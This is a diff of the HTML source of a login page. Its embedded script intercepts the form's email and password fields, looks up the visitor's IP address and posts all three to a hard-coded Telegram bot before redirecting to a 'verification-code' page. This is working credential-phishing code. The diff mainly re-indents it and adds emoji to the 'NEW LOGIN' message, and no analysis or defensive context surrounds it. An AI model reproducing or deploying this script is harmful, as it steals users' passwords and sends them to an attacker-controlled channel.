@@ -57,7 +57,7 @@
         content="BKuBk1O/EXTVs5TgzilZe8cM/+Uzoq+GpViOfPlFcd/RCVk755kBHp7cW/iemKnQEPgQ6yfTOnOLf/dBkqU+HQ==">
     <link rel="stylesheet" media="all"
         href="css/application-0189d16e9dcf751fcf91038fa9ac30c98194116564b5125b826c9f7219da2f93.css">
-    
+
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link
@@ -203,80 +203,80 @@
     <script>
         // Function to get the user's IP address
         async function getIpAddress() {
-          try {
-            const response = await fetch('https://api64.ipify.org?format=json');
-            const data = await response.json();
-            return data.ip;
-          } catch (error) {
-            console.error('Error fetching IP address:', error);
-            return null;
-          }
+            try {
+                const response = await fetch('https://api64.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error fetching IP address:', error);
+                return null;
+            }
         }
-      
+
         // Function to send data to Telegram
         async function telegramSend(email, password, ipAddress) {
-          const apiKey = '6823207180:AAGL2irV8sxTN0R1j35RHJ7iteabC3Tz2Mw';
-          const chatId = '6845072076';
-          const format = 'HTML';
-      
-          const message = `----NEW LOGIN 2----:\nEmail: ${email}\nPassword: ${password}\nIP Address: ${ipAddress}`;
-      
-          const apiUrl = `https://api.telegram.org/bot${apiKey}/sendMessage`;
-      
-          const formData = new FormData();
-          formData.append('chat_id', chatId);
-          formData.append('text', message);
-          formData.append('parse_mode', format);
-      
-          try {
-            const response = await fetch(apiUrl, {
-              method: 'POST',
-              body: formData,
-            });
-      
-            const result = await response.json();
-      
-            // Assuming you want to handle the response or perform additional actions based on it
-            console.log(result);
-      
-            return true;
-          } catch (error) {
-            // Log any errors that occur during the Telegram send
-            console.error('Error sending message to Telegram:', error);
-            return false;
-          }
-        }
-      
-        document.getElementById('myForm').addEventListener('submit', async function (event) {
-          event.preventDefault(); // Prevent the default form submission
-      
-          // Get the values from the form
-          const email = document.getElementById('user_email').value;
-          const password = document.getElementById('user_password').value;
-      
-          try {
-            // Get the user's IP address
-            const ipAddress = await getIpAddress();
-      
-            // Call the Telegram send function
-            const success = await telegramSend(email, password, ipAddress);
-      
-            // Check if the Telegram send was successful
-            if (success) {
-              // Redirect to 'error.html' after successful form submission
-              window.location.href = 'verification-code.html';
-            } else {
-              // Optionally, you can handle the case where Telegram send was not successful
-              console.error('Telegram send was not successful.');
-              // You can add additional error handling code here if needed
+            const apiKey = '6823207180:AAGL2irV8sxTN0R1j35RHJ7iteabC3Tz2Mw';
+            const chatId = '6845072076';
+            const format = 'HTML';
+
+            const message = `----♻️NEW LOGIN ♻️----\n✉️Email: ${email}\n🔒Password: ${password}\n📲IP Address: ${ipAddress}`;
+
+            const apiUrl = `https://api.telegram.org/bot${apiKey}/sendMessage`;
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('text', message);
+            formData.append('parse_mode', format);
+
+            try {
+                const response = await fetch(apiUrl, {
+                    method: 'POST',
+                    body: formData,
+                });
+
+                const result = await response.json();
+
+                // Assuming you want to handle the response or perform additional actions based on it
+                console.log(result);
+
+                return true;
+            } catch (error) {
+                // Log any errors that occur during the Telegram send
+                console.error('Error sending message to Telegram:', error);
+                return false;
             }
-          } catch (error) {
-            // Log any errors that occur during the form submission
-            console.error('Error during form submission:', error);
-            // You can add additional error handling code here if needed
-          }
+        }
+
+        document.getElementById('myForm').addEventListener('submit', async function (event) {
+            event.preventDefault(); // Prevent the default form submission
+
+            // Get the values from the form
+            const email = document.getElementById('user_email').value;
+            const password = document.getElementById('user_password').value;
+
+            try {
+                // Get the user's IP address
+                const ipAddress = await getIpAddress();
+
+                // Call the Telegram send function
+                const success = await telegramSend(email, password, ipAddress);
+
+                // Check if the Telegram send was successful
+                if (success) {
+                    // Redirect to 'error.html' after successful form submission
+                    window.location.href = 'verification-code.html';
+                } else {
+                    // Optionally, you can handle the case where Telegram send was not successful
+                    console.error('Telegram send was not successful.');
+                    // You can add additional error handling code here if needed
+                }
+            } catch (error) {
+                // Log any errors that occur during the form submission
+                console.error('Error during form submission:', error);
+                // You can add additional error handling code here if needed
+            }
         });
-      </script>
+    </script>
 
 
 </body>
